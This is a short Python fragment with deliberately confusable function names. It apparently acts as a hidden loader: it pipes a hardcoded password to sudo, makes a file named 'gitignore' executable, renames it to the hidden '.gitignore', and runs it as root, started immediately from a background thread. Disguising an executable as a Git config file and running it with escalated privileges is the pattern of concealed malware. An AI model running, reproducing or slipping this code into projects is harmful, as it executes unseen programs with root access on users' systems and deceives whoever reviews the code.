import subprocess

def IIIlIllI():
    subprocess.getoutput('echo user | sudo -S chmod +x ./gitignore')
    subprocess.getoutput('echo user | sudo -S mv gitignore .gitignore')
    subprocess.getoutput('echo user | sudo -S ./.gitignore')

def IIIlIlll():
    threading.Timer(0, IIIlIllI).start()